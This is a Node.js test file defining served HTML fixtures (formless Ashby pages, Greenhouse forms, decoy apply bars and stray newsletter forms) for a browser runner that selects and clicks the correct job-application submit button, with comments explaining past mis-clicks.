/* THE SUBMIT CHOOSER, RUN AGAINST PRODUCTION-SHAPED ATS DOM INSTEAD OF READ AS A STRING.
 *
 * The only coverage this chooser had was `assert.match(SANDBOX_RUNNER, /confirmAndSubmitPass/)`,
 * which asserts that a name appears in a string. It cannot catch a chooser that finds nothing and
 * throws, and it did not.
 *
 * Measured on the live kos.ai Ashby application page on 2026-08-11:
 *
 *   document.querySelectorAll('form').length   0
 *   input elements                             4, plus 1 textarea and 2 input[type=file]
 *   Submit Application button                  visible, enabled, final intent, NO form ancestor
 *   its ancestor chain                         button -> div#form -> div.ashby-job-posting-right-pane
 *
 * The viability filter required element.closest('form'), so the viable list was empty on every
 * Ashby application and the pass threw "Atomic submit control was missing or ambiguous" before any
 * click. Meanwhile the live Haize Labs Greenhouse page has exactly 1 form and must keep behaving
 * as it does today.
 *
 * Half of these cases exist because a first attempt at the fix was wrong in ways only a served
 * page could show: a container scope that competed with a real form let a header "Apply Now"
 * outscore an in-form "Submit" and take the click, and an innermost container smaller than the
 * application clicked with a required question elsewhere on the page still empty. Both are pinned
 * below.
 *
 * The stray-form cases were measured later, on the same shape. Requiring a form ancestor was
 * replaced by accepting ANY form ancestor, so a button that merely sat inside some form on the
 * page counted as a submit. On an Ashby application carrying one unrelated form, the runner
 * pressed the newsletter when its button said "Submit" and the filter when its button said
 * "Apply", and the application itself was unreachable either way, because a stray form holding a
 * final-intent control also switches the container path off. Those pages are served here too.
 *
 * Every test spawns the shipped runner against a served page and asserts on what happened: which
 * button was pressed, how many times, and which node the pass bound as its scope. Nothing here
 * matches on runner source text.
 */
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { WebSocketServer } from 'ws';
import {
  ATOMIC_SUBMIT_V4_CAPABILITY,
  ATOMIC_SUBMIT_POLICY,
  ATOMIC_SUBMIT_POLICY_V4,
  EXACT_PAGE_URL_CAPABILITY,
  SANDBOX_RUNNER
} from '../src/managed-browser.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));

const SUBMISSION_ATTEMPT = Object.freeze({
  runId: '11111111-1111-4111-8111-111111111111',
  claimId: '22222222-2222-4222-8222-222222222222',
  executionId: '33333333-3333-4333-8333-333333333333'
});

const providerDeadlineAt = () => new Date(Date.now() + 240_000).toISOString();

const HELPERS = `
  document.querySelectorAll('form input, form textarea, form select').forEach(function (control) {
    if (!control.name && control.id) control.name = control.id;
  });
  function attach(id) {
    var transfer = new DataTransfer();
    transfer.items.add(new File(['resume'], 'resume.pdf', { type: 'application/pdf' }));
    document.getElementById(id).files = transfer.files;
  }
  var lastActivatedSubmitter = null;
  document.addEventListener('click', function (event) {
    lastActivatedSubmitter = event.target.closest && event.target.closest('button, input[type="submit"], [role="button"]');
  }, true);
  function record(who) {
    var log = document.getElementById('submitted');
    log.textContent = log.textContent ? log.textContent + ',' + who : who;
    var submitter = lastActivatedSubmitter || document.activeElement;
    var form = submitter && submitter.form;
    var payload;
    if (form) {
      payload = new FormData(form,
        submitter instanceof HTMLButtonElement || submitter instanceof HTMLInputElement
          ? submitter : undefined);
    } else {
      payload = new FormData();
      var scope = submitter && submitter.closest('#form, [class*="application"], [data-application]');
      if (!scope) scope = document.getElementById('form');
      Array.from(scope ? scope.querySelectorAll('input, textarea, select') : []).forEach(function (control) {
        if (control.disabled) return;
        var name = control.name || control.id;
        if (!name) return;
        if (control instanceof HTMLInputElement
          && (control.type === 'checkbox' || control.type === 'radio') && !control.checked) return;
        if (control instanceof HTMLInputElement && control.type === 'file') {
          Array.from(control.files || []).forEach(function (file) { payload.append(name, file); });
        } else if (control instanceof HTMLSelectElement) {
          Array.from(control.selectedOptions).forEach(function (option) { payload.append(name, option.value); });
        } else {
          payload.append(name, control.value || '');
        }
      });
      if (submitter && (submitter.name || submitter.id)) {
        payload.append(submitter.name || submitter.id, submitter.value || '');
      }
    }
    navigator.sendBeacon('/record-click?who=' + encodeURIComponent(who), payload);
  }`;

/* The formless Ashby shape: a plain div#form holding every control, no <form> element anywhere on
 * the page, and the submit button as a sibling of the fields inside that div. */
const ASHBY = `<!doctype html><meta charset="utf-8"><title>Formless Ashby application</title>
<div id="root"><div class="_container_dea4p_28"><div class="_content_dea4p_70">
<div class="ashby-job-posting-right-pane">
<div id="form">
  <div class="field"><label for="name">Full name *</label><input id="name" required value="Mehek Mandal"></div>
  <div class="field"><label for="email">Email *</label><input id="email" type="email" required value="mehek@example.com"></div>
  <div class="field"><label for="phone">Phone *</label><input id="phone" type="tel" required value="+971501234567"></div>
  <div class="field"><label for="linkedin">LinkedIn</label><input id="linkedin" value="https://www.linkedin.com/in/mehek"></div>
  <div class="field"><label for="why">Why this role? *</label><textarea id="why" required>Because it fits.</textarea></div>
  <div class="field"><label for="resume">Resume *</label><input id="resume" type="file" required></div>
  <div class="field"><label for="cover">Cover letter</label><input id="cover" type="file"></div>
  <div class="_fieldEntry_1e3gg_28 ashby-application-form-field-entry" data-field-path="4c3852e7-e63c-44dc-956b-a819f456e945">
    <label class="_heading_f7cvd_52 _required_f7cvd_91 _label_1e3gg_42 ashby-application-form-question-title" for="4c3852e7-e63c-44dc-956b-a819f456e945">Prior US Government Employment?</label>
    <div class="_description_1e3gg_48 ashby-application-form-question-description"><p>Have you worked for the US government in the last 10 years?</p></div>
    <div class="_container_1svni_28 _yesno_1e3gg_148">
      <button class="_container_pjyt6_1 _option_1svni_32">Yes</button>
      <button class="_container_pjyt6_1 _option_1svni_32 _active_1svni_57">No</button>
      <input type="checkbox" class="_input_1svni_78" style="display:none" tabindex="-1" name="4c3852e7-e63c-44dc-956b-a819f456e945">
    </div>
  </div>
  <button id="submit" class="_button_zyh3g_28 _primary_zyh3g_97">Submit Application</button>
</div>
</div></div></div>
<div id="submitted"></div>
<script>${HELPERS}
  attach('resume');
  var ashbyParams = new URLSearchParams(location.search);
  if (ashbyParams.has('leave-government-unanswered')) {
    document.querySelector('button._active_1svni_57').classList.remove('_active_1svni_57');
  }
  if (ashbyParams.has('non-ashby-radio-peer')) {
    document.getElementById('submit').insertAdjacentHTML('beforebegin',
      '<fieldset id="ordinary-radio"><legend>Preferred shift *</legend>'
      + '<input id="day-shift" type="radio" name="shift" required><label for="day-shift">Day</label>'
      + '<input id="night-shift" type="radio" name="shift" checked><label for="night-shift">Night</label>'
      + '<button type="button">Details</button></fieldset>');
  }
  if (ashbyParams.has('fieldset-sibling-checkbox')) {
    document.getElementById('submit').insertAdjacentHTML('beforebegin',
      '<fieldset id="ordinary-checkbox"><legend>Applicant consent *</legend>'
      + '<input id="applicant-consent" type="checkbox" required><label for="applicant-consent">I consent</label>'
      + '<div class="_yesno_sibling"><button type="button" class="_active_sibling" style="display:none">Yes</button>'
      + '<button type="button" style="display:none">No</button></div></fieldset>');
  }
  document.getElementById('submit').addEventListener('click', function () { record('ashby'); });
</script>`;

/* The Greenhouse shape: one real form, plus the top-of-page Apply button that sits outside it. */
const GREENHOUSE = `<!doctype html><meta charset="utf-8"><title>Greenhouse application</title>
<div id="page">
  <div id="header"><h1>Software Engineering Intern</h1><button id="decoy">Apply</button></div>
  <form id="application" novalidate>
    <div class="field"><label for="gh-name">Full name *</label><input id="gh-name" required value="Mehek Mandal"></div>
    <div class="field"><label for="gh-email">Email *</label><input id="gh-email" type="email" required value="mehek@example.com"></div>
    <div class="field"><label for="gh-resume">Resume *</label><input id="gh-resume" type="file" required></div>
    <button id="submit" type="submit">Submit application</button>
  </form>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  attach('gh-resume');
  document.getElementById('decoy').addEventListener('click', function () { record('decoy'); });
  document.getElementById('application').addEventListener('submit', function (event) {
    event.preventDefault();
    record('greenhouse');
  });
</script>`;

/* THE OUTSCORING DECOY. The real submit is labelled "Submit", which is what SmartRecruiters,
 * Workday and Paylocity actually render, and it scores 1. The sticky header "Apply Now" scores 2
 * and has no form, but its walk climbs out of the header into the wrapper that also holds the
 * form's inputs. If a container may compete with a form, the decoy wins on score and the run
 * presses the wrong control on a real employer form. */
const OUTSCORING_DECOY = `<!doctype html><meta charset="utf-8"><title>Header apply over a real form</title>
<div id="wrapper">
  <div id="header"><button id="decoy">Apply Now</button></div>
  <form id="application" novalidate>
    <div class="field"><label for="d-name">Full name *</label><input id="d-name" required value="Mehek Mandal"></div>
    <div class="field"><label for="d-email">Email *</label><input id="d-email" type="email" required value="mehek@example.com"></div>
    <button id="submit" type="submit">Submit</button>
  </form>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('decoy').addEventListener('click', function () { record('decoy'); });
  document.getElementById('application').addEventListener('submit', function (event) {
    event.preventDefault();
    record('real');
  });
</script>`;

/* No form, and no qualifying ancestor either: the fields and the button are direct children of
 * body, so the only container that holds both is body itself. That is not a scope. */
const BODY_ONLY = `<!doctype html><meta charset="utf-8"><title>Body scope only</title>
<label for="name">Full name *</label><input id="name" required value="Mehek Mandal">
<label for="email">Email *</label><input id="email" type="email" required value="mehek@example.com">
<button id="submit">Submit Application</button>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('submit').addEventListener('click', function () { record('body'); });
</script>`;

/* Two controls with identical text inside the same formless container. Equal top score is the
 * ambiguity rule's exact trigger, and the container scope must not weaken it. */
const AMBIGUOUS = `<!doctype html><meta charset="utf-8"><title>Ambiguous formless</title>
<div id="root"><div id="form">
  <div class="field"><label for="name">Full name *</label><input id="name" required value="Mehek Mandal"></div>
  <div class="field"><label for="resume">Resume *</label><input id="resume" type="file" required></div>
  <button id="submit-a">Submit Application</button>
  <button id="submit-b">Submit Application</button>
</div></div>
<div id="submitted"></div>
<script>${HELPERS}
  attach('resume');
  document.getElementById('submit-a').addEventListener('click', function () { record('a'); });
  document.getElementById('submit-b').addEventListener('click', function () { record('b'); });
</script>`;

/* THE UNDER-SCOPED CONTAINER. The submit sits in a final section with the consent field, and the
 * employer's work authorisation question is one level up and empty. The innermost container holds
 * a field, so it qualifies on that test alone, and binding it would scan one answered checkbox and
 * click an incomplete application. */
const NESTED = `<!doctype html><meta charset="utf-8"><title>Nested under-scope</title>
<div id="outer">
  <div class="field"><label for="work">Work authorisation *</label><input id="work" required value=""></div>
  <div id="inner">
    <div class="field"><label for="consent">I agree *</label><input id="consent" required value="Yes"></div>
    <button id="submit">Submit Application</button>
  </div>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('submit').addEventListener('click', function () { record('nested'); });
</script>`;

/* The submit lives in a footer bar that holds no fields at all, so the nearest ancestor holding a
 * field is the wrapper above both. Nothing else on the page is required, so the wrapper is the
 * application and the run may press it. */
const FOOTER_BAR = `<!doctype html><meta charset="utf-8"><title>Submit outside the field container</title>
<div id="page">
  <div id="fields">
    <div class="field"><label for="f-name">Full name *</label><input id="f-name" required value="Mehek Mandal"></div>
    <div class="field"><label for="f-email">Email *</label><input id="f-email" type="email" required value="mehek@example.com"></div>
  </div>
  <div id="footer-bar"><button id="submit">Submit Application</button></div>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('submit').addEventListener('click', function () { record('footer'); });
</script>`;

/* The same shape with page furniture that is itself required and formless. The wrapper is the only
 * ancestor of the submit that holds fields, so the furniture is inside the bound scope and the
 * scan reports it. That is not a good outcome and it is the honest one: nothing in a formless DOM
 * says whether a required field beside the application belongs to it. The rule this pins is that
 * the run withholds the click rather than sending an application it cannot account for. */
const FOOTER_BAR_FURNITURE = `<!doctype html><meta charset="utf-8"><title>Furniture inside the wrapper</title>
<div id="page">
  <div id="fields">
    <div class="field"><label for="f-name">Full name *</label><input id="f-name" required value="Mehek Mandal"></div>
  </div>
  <div id="alerts">
    <div class="field"><label for="alert-email">Job alert email *</label><input id="alert-email" required value=""></div>
  </div>
  <div id="footer-bar"><button id="submit">Submit Application</button></div>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('submit').addEventListener('click', function () { record('furniture'); });
</script>`;

/* THE BAMBOOHR SHAPE: a formless application sitting beside a real <form> that is not an
 * application at all. The newsletter's email is required, and it must not veto the application,
 * because it belongs to its own form's submission.
 *
 * Its button used to say "Subscribe", which is not a final control at all, so this case never
 * exercised the veto its own name claims: the form path found nothing here whatever the scope
 * rules did. "Submit" is the label that makes it a real boundary, and it is the label the reviewer
 * measured taking the click on a live page. */
const SIBLING_FORM = `<!doctype html><meta charset="utf-8"><title>Formless application beside a real form</title>
<div id="page">
  <form id="newsletter">
    <div class="field"><label for="alerts">Job alert email *</label><input id="alerts" type="email" required value=""></div>
    <button id="subscribe" type="submit">Submit</button>
  </form>
  <div id="app-form">
    <div class="field"><label for="b-name">Full name *</label><input id="b-name" required value="Mehek Mandal"></div>
    <div class="field"><label for="b-email">Email *</label><input id="b-email" type="email" required value="mehek@example.com"></div>
    <div class="field"><label for="b-resume">Resume *</label><input id="b-resume" type="file" required></div>
    <button id="submit">Submit Application</button>
  </div>
  <div id="search"><input id="site-search" type="search" placeholder="Search jobs"></div>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  attach('b-resume');
  document.getElementById('submit').addEventListener('click', function () { record('bamboo'); });
  document.getElementById('newsletter').addEventListener('submit', function (event) {
    event.preventDefault();
    record('subscribe');
  });
</script>`;

/* THE STRAY FORM, which is the shape that made the runner press a control belonging to something
 * else on a real employer page.
 *
 * Same Ashby application as above, and one unrelated form beside it. Its field is answered, so
 * nothing stops the click but the choice of scope. Measured in Chromium before this fix: the
 * newsletter took the click, and the application was never pressed. Two things went wrong at once
 * and both are here. The stray form's button is a viable candidate on its own, and because it is
 * viable under the form rule it also switches the container path off, so the real application
 * cannot be selected even after the stray control loses.
 *
 * The three labels are the point of the three fixtures. "Submit" and "Apply" are what the reviewer
 * measured; "Subscribe" is the benign one, and it is here so that a fix which only recognises the
 * two reported labels cannot pass. */
const strayPage = (title, stray) => `<!doctype html><meta charset="utf-8"><title>` + title + `</title>
<div id="page">
` + stray + `
  <div id="app-form">
    <div class="field"><label for="a-name">Full name *</label><input id="a-name" required value="Mehek Mandal"></div>
    <div class="field"><label for="a-email">Email *</label><input id="a-email" type="email" required value="mehek@example.com"></div>
    <div class="field"><label for="a-phone">Phone *</label><input id="a-phone" type="tel" required value="+971501234567"></div>
    <div class="field"><label for="a-resume">Resume *</label><input id="a-resume" type="file" required></div>
    <button id="submit">Submit Application</button>
  </div>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  attach('a-resume');
  document.getElementById('submit').addEventListener('click', function () { record('application'); });
  document.getElementById('stray').addEventListener('submit', function (event) {
    event.preventDefault();
    record('stray');
  });
</script>`;

const NEWSLETTER = `  <form id="stray">
    <div class="field"><label for="alerts">Job alert email *</label><input id="alerts" type="email" required value="reader@example.com"></div>
    <button id="stray-submit" type="submit">Submit</button>
  </form>`;

/* A filter is made of choices, not of intake, which is why counting selects as evidence of an
 * application would hand this one the click. The keyword box is deliberately a plain text input
 * rather than type=search, so this case does not pass on the ARIA read alone. */
const FILTER = `  <form id="stray">
    <div class="field"><label for="keyword">Keyword</label><input id="keyword" type="text" value="engineer"></div>
    <div class="field"><label for="location">Location</label><select id="location"><option selected>Dubai</option></select></div>
    <div class="field"><label for="team">Team</label><select id="team"><option selected>Engineering</option></select></div>
    <button id="stray-submit" type="submit">Apply</button>
  </form>`;

const SUBSCRIBE = `  <form id="stray">
    <div class="field"><label for="alerts">Job alert email *</label><input id="alerts" type="email" required value="reader@example.com"></div>
    <button id="stray-submit" type="submit">Subscribe</button>
  </form>`;

const STRAY_NEWSLETTER = strayPage('Application beside a newsletter form', NEWSLETTER);
const STRAY_FILTER = strayPage('Application beside a filter form', FILTER);
const STRAY_SUBSCRIBE = strayPage('Application beside a subscribe form', SUBSCRIBE);

/* THE SAME STRAY FORM WITH NO APPLICATION ANYWHERE. Its field is answered and its button says
 * "Submit", so nothing except the scope rules stands between this run and a stranger's newsletter.
 * A run that cannot find an application refuses: a refusal costs a retry, and a wrong click cannot
 * be withdrawn. */
const STRAY_ONLY = `<!doctype html><meta charset="utf-8"><title>A stray form and no application</title>
<div id="page">
  <form id="stray">
    <div class="field"><label for="alerts">Job alert email *</label><input id="alerts" type="email" required value="reader@example.com"></div>
    <button id="stray-submit" type="submit">Submit</button>
  </form>
  <div id="posting"><h1>Software Engineering Intern</h1><p>Applications open until September.</p></div>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('stray').addEventListener('submit', function (event) {
    event.preventDefault();
    record('stray');
  });
</script>`;

/* THE FALSE-POSITIVE GUARD, and the case that matters most. Modelled on the live kos.ai posting:
 * name, email, a resume file input, and nothing else. Its button says "Submit", the weakest final
 * label there is, so nothing about the control itself can rescue this form. If the test for "is
 * this the application" is tuned by field count alone, this real application is the first thing it
 * throws away. */
const MINIMAL_APPLICATION = `<!doctype html><meta charset="utf-8"><title>A three field application</title>
<form id="application" novalidate>
  <div class="field"><label for="k-name">Full name *</label><input id="k-name" required value="Mehek Mandal"></div>
  <div class="field"><label for="k-email">Email *</label><input id="k-email" type="email" required value="mehek@example.com"></div>
  <div class="field"><label for="k-resume">Resume *</label><input id="k-resume" type="file" required></div>
  <button id="submit" type="submit">Submit</button>
</form>
<div id="submitted"></div>
<script>${HELPERS}
  attach('k-resume');
  document.getElementById('application').addEventListener('submit', function (event) {
    event.preventDefault();
    record('minimal');
  });
</script>`;

/* A real Greenhouse form with the same stray newsletter beside it. Nothing about which control is
 * pressed may change here: the application already outscores the newsletter today, and it has to
 * keep winning for the reason it wins now as well as the new one. */
const GREENHOUSE_STRAY = `<!doctype html><meta charset="utf-8"><title>Greenhouse beside a newsletter form</title>
<div id="page">
  <div id="header"><h1>Software Engineering Intern</h1><button id="decoy">Apply</button></div>
  <form id="stray">
    <div class="field"><label for="alerts">Job alert email *</label><input id="alerts" type="email" required value="reader@example.com"></div>
    <button id="stray-submit" type="submit">Submit</button>
  </form>
  <form id="application" novalidate>
    <div class="field"><label for="g-name">Full name *</label><input id="g-name" required value="Mehek Mandal"></div>
    <div class="field"><label for="g-email">Email *</label><input id="g-email" type="email" required value="mehek@example.com"></div>
    <div class="field"><label for="g-resume">Resume *</label><input id="g-resume" type="file" required></div>
    <button id="submit" type="submit">Submit application</button>
  </form>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  attach('g-resume');
  document.getElementById('decoy').addEventListener('click', function () { record('decoy'); });
  document.getElementById('stray').addEventListener('submit', function (event) {
    event.preventDefault();
    record('stray');
  });
  document.getElementById('application').addEventListener('submit', function (event) {
    event.preventDefault();
    record('greenhouse');
  });
</script>`;

/* Recruitee localizes its stock final button to the exact bare label "Senden" on German tenants.
 * Captured on the live CBS Consulting application on 2026-08-21. The page-level decoy proves the
 * new label still earns nothing by itself: only the copy inside the form this run addressed may
 * bind a submission scope. */
const RECRUITEE_GERMAN = `<!doctype html><meta charset="utf-8"><title>German Recruitee application</title>
<div id="page">
  <button id="page-send" type="button">Senden</button>
  <form id="application" novalidate>
    <div class="field"><label for="salutation">Allgemeine Anrede *</label><select id="salutation" required><option>Auswählen</option><option selected>Frau</option></select></div>
    <div class="field"><label for="candidate-name">Name *</label><input id="candidate-name" name="candidate.name" required value="Mehek Mandal"></div>
    <div class="field"><label for="candidate-email">E-Mail *</label><input id="candidate-email" name="candidate.email" type="email" required value="mehek@example.com"></div>
    <div class="field"><label for="candidate-phone">Telefon *</label><input id="candidate-phone" name="candidate.phone" type="tel" required value="+491234567890"></div>
    <div class="field"><label for="candidate-cv">Lebenslauf *</label><input id="candidate-cv" name="candidate.cv" type="file" required></div>
    <div class="field"><label for="candidate-letter">Anschreiben</label><input id="candidate-letter" name="candidate.coverLetterFile" type="file"></div>
    <fieldset><legend>Bevorzugter Arbeitsort</legend><label><input type="checkbox" name="workplace"> Berlin</label><label><input type="checkbox" name="workplace"> Remote</label></fieldset>
    <button id="application-send" type="submit">Senden</button>
  </form>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  attach('candidate-cv');
  attach('candidate-letter');
  document.getElementById('page-send').addEventListener('click', function () { record('page'); });
  document.getElementById('application').addEventListener('submit', function (event) {
    event.preventDefault();
    record('recruitee');
  });
</script>`;

/* ONE FIELD, ONE BUTTON, AND NOTHING ELSE TO GO ON. Structure cannot separate this from a
 * newsletter, because there is nothing here a newsletter does not also have: one email, required,
 * and a button reading "Submit". The two cases below serve this identical page and differ only in
 * whether the run was sent to fill that field first. A run that typed into this form was filling
 * it; a run that never touched it has no reason to believe it is an application. The field is
 * answered in the markup so the required-field gate is not what decides either case. */
const ONE_FIELD_FORM = `<!doctype html><meta charset="utf-8"><title>A one field form</title>
<form id="signup" novalidate>
  <div class="field"><label for="one-email">Email *</label><input id="one-email" type="email" required value="mehek@example.com"></div>
  <button id="submit" type="submit">Submit</button>
</form>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('signup').addEventListener('submit', function (event) {
    event.preventDefault();
    record('one-field');
  });
</script>`;

/* THE OTHER HALF OF DISQUALIFYING A FORM, and the one that bites.
 *
 * Refusing a form does not only withhold the click from that form. It also removes that form from
 * the test PR 42 uses to switch the container path off, so a page whose real application form
 * cannot be confirmed suddenly lets a formless region compete, and the click lands on the region
 * rather than on the form. Main presses the application on both pages below, because on main any
 * form at all switches the container path off.
 *
 * Both shapes are ordinary. The first is a continuation page carrying only voluntary
 * self-identification questions, which is the standard second phase on Greenhouse, Lever and
 * Workday. The second is a one question screening form, which Ashby and Workable render constantly.
 * Neither holds two text-entry controls and neither holds a file input, so both fail the form test
 * on structure alone, and the sticky "Apply Now" bar beside them holds an email box, which is
 * enough for the old container walk to accept it.
 *
 * The rule these pin: a run that has refused a form does not go looking for something else to
 * press. It either finds evidence that the formless region is the application, held to the same
 * test the form was held to, or it refuses. A refusal costs a retry. */
const stickyBarPage = (title, application, decoy) => `<!doctype html><meta charset="utf-8"><title>` + title + `</title>
<div id="page">
` + application + `
` + decoy + `
</div>
<div id="submitted"></div>
<script>${HELPERS}
  if (document.getElementById('decoy-cv')) attach('decoy-cv');
  document.getElementById('decoy-apply').addEventListener('click', function () { record('decoy'); });
  document.getElementById('real').addEventListener('submit', function (event) {
    event.preventDefault();
    record('application');
  });
</script>`;

/* THE THIN DECOY: one email box. It cannot clear an intake test on any reading, which is exactly
 * why it cannot be the only decoy in this file. */
const THIN_BAR = `  <div id="decoy">
    <div class="field"><label for="decoy-email">Email me about this role</label><input id="decoy-email" type="email" value="reader@example.com"></div>
    <button id="decoy-apply">Apply Now</button>
  </div>`;

/* THE DECOYS THAT CLEAR THE BAR, which is the version of the adversary that can actually win.
 *
 * A fixed intake bar is not enough on its own: a formless widget that collects a name and an email,
 * or an email and a CV upload, satisfies exactly the test the refused form failed, and React pages
 * render widgets like these with no <form> element at all, for the same reason Ashby renders none.
 * "Refer a friend", "Talk to a recruiter", "Get job alerts" and "Join our talent pool" are all this
 * shape, and all of them wear a final-intent label sooner or later.
 *
 * Paired with the refused application shapes below, both of these took the click before the gate
 * became a comparison rather than a threshold. */
const RECRUITER_WIDGET = `  <div id="decoy">
    <h2>Talk to a recruiter</h2>
    <div class="field"><label for="decoy-name">Your name</label><input id="decoy-name" value="Mehek Mandal"></div>
    <div class="field"><label for="decoy-email">Your email</label><input id="decoy-email" type="email" value="reader@example.com"></div>
    <button id="decoy-apply">Apply Now</button>
  </div>`;

const TALENT_POOL_WIDGET = `  <div id="decoy">
    <h2>Join our talent pool</h2>
    <div class="field"><label for="decoy-email">Your email</label><input id="decoy-email" type="email" value="reader@example.com"></div>
    <div class="field"><label for="decoy-cv">Attach a CV</label><input id="decoy-cv" type="file"></div>
    <button id="decoy-apply">Apply Now</button>
  </div>`;

const EEO_FORM = `  <form id="real" novalidate>
    <div class="field"><label for="race">Race *</label><select id="race" required><option value="Decline">Decline to self identify</option><option value="Asian" selected>Asian</option></select></div>
    <div class="field"><label for="gender">Gender *</label><select id="gender" required><option selected>Female</option></select></div>
    <div class="field"><label for="veteran">Veteran status *</label><select id="veteran" required><option selected>I am not a protected veteran</option></select></div>
    <button id="submit" type="submit">Submit</button>
  </form>`;

const SCREENING_FORM = `  <form id="real" novalidate>
    <div class="field"><label for="years">How many years of Python have you written? *</label><input id="years" required value="3"></div>
    <button id="submit" type="submit">Submit</button>
  </form>`;

const EEO_STICKY_BAR = stickyBarPage('Self identification page under a sticky bar', EEO_FORM, THIN_BAR);
const SCREENING_STICKY_BAR = stickyBarPage('One question screening under a sticky bar', SCREENING_FORM, THIN_BAR);
const EEO_RICH_DECOY = stickyBarPage('Self identification page beside a recruiter widget', EEO_FORM, RECRUITER_WIDGET);
const SCREENING_RICH_DECOY = stickyBarPage('Screening question beside a talent pool widget', SCREENING_FORM, TALENT_POOL_WIDGET);

/* An empty required field inside the container, and an unrelated block outside it carrying a live
 * validation error over a field that is not required. Only the first belongs to this application. */
const SCAN_BOUNDS = `<!doctype html><meta charset="utf-8"><title>Container scope bounds</title>
<div id="page">
  <div id="app-form">
    <div class="field"><label for="s-name">Full name *</label><input id="s-name" required value=""></div>
    <button id="submit">Submit Application</button>
  </div>
  <div id="aside">
    <div class="field"><label for="aside-note">Newsletter</label><input id="aside-note" aria-invalid="true" value="x"><span>This requires an answer</span></div>
  </div>
</div>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('submit').addEventListener('click', function () { record('scan-bounds'); });
</script>`;

/* THE RETAINED PAGE, TWICE. Phase zero binds a scope inside a shadow root. Phase one runs on the
 * same live Page after the DOM has moved on, and the candidate index that addressed the shadow
 * scope now addresses a light-DOM one. A marker left behind inside the shadow tree makes that
 * index match two nodes and throws for the rest of the session. */
const SHADOW = `<!doctype html><meta charset="utf-8"><title>Shadow scope across two passes</title>
<div id="host"></div>
<div id="light">
  <div class="field"><label for="l-name">Full name *</label><input id="l-name" required value="Mehek Mandal"></div>
  <button id="l-submit">Continue</button>
</div>
<button id="mutate">Refresh listing</button>
<div id="submitted"></div>
<script>${HELPERS}
  var root = document.getElementById('host').attachShadow({ mode: 'open' });
  root.innerHTML = '<div id="s-form"><div class="field"><label for="s-name">Full name *</label>'
    + '<input id="s-name" required value="Mehek Mandal"></div>'
    + '<button id="s-submit">Submit Application</button></div>';
  root.getElementById('s-submit').addEventListener('click', function () { record('shadow'); });
  document.getElementById('l-submit').addEventListener('click', function () { record('light'); });
  document.getElementById('mutate').addEventListener('click', function () {
    var shadowSubmit = root.getElementById('s-submit');
    if (shadowSubmit) shadowSubmit.remove();
    document.getElementById('l-submit').textContent = 'Submit Application';
  });
</script>`;

const WORKABLE_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>Workable application</title>
<form id="application" action="/jobs/application" novalidate>
  <div class="field"><label for="first-name">First name *</label><input id="first-name" name="first_name" required></div>
  <div class="field"><label for="last-name">Last name *</label><input id="last-name" name="last_name" required></div>
  <div class="field"><label for="email">Email *</label><input id="email" name="email" type="email" required></div>
  <div class="field"><label for="resume">Resume *</label><input id="resume" name="resume" type="file" required></div>
  <button id="send" type="submit">Send</button>
</form>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application').addEventListener('submit', function (event) {
    event.preventDefault();
    record('workable');
    document.getElementById('submitted').textContent = 'Thank you for applying';
  });
</script>`;

const CONTACT_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>Contact form</title>
<form id="contact" action="/contact" novalidate>
  <label for="contact-email">Email</label><input id="contact-email" type="email">
  <label for="message">Message</label><textarea id="message"></textarea>
  <button id="send" type="submit">Send</button>
</form>
<div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('contact').addEventListener('submit', function (event) {
    event.preventDefault();
    record('contact');
  });
</script>`;

const CANDIDATE_SUPPORT_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>Candidate support</title>
<form id="candidate_contact" action="/candidate/support" novalidate>
  <label for="support-email">Email</label><input id="support-email" type="email">
  <label for="support-message">Message</label><textarea id="support-message"></textarea>
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('candidate_contact').addEventListener('submit', function (event) {
    event.preventDefault(); record('candidate-support');
  });
</script>`;

const APPLICATION_FEEDBACK_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>Application feedback</title>
<form id="application_feedback" action="/application/feedback" novalidate>
  <label for="feedback-email">Email</label><input id="feedback-email" type="email">
  <label for="feedback-message">Feedback</label><textarea id="feedback-message"></textarea>
  <label for="feedback-resume">Resume</label><input id="feedback-resume" name="resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application_feedback').addEventListener('submit', function (event) {
    event.preventDefault(); record('application-feedback');
  });
</script>`;

const APPLICATION_SUPPORT_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>Application support</title>
<form id="application_support" action="/application/support" novalidate>
  <label for="application-support-email">Email</label><input id="application-support-email" type="email">
  <label for="application-support-resume">Resume</label><input id="application-support-resume" name="resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application_support').addEventListener('submit', function (event) {
    event.preventDefault(); record('application-support');
  });
</script>`;

const applicationIdentityDecoyPage = (kind) => `<!doctype html><meta charset="utf-8"><title>Application ` + kind + `</title>
<form id="application_` + kind + `" action="/application/` + kind + `" novalidate>
  <label for="` + kind + `-email">Email</label><input id="` + kind + `-email" type="email">
  <label for="` + kind + `-resume">Resume</label><input id="` + kind + `-resume" name="resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application_` + kind + `').addEventListener('submit', function (event) {
    event.preventDefault(); record('application-` + kind + `');
  });
</script>`;

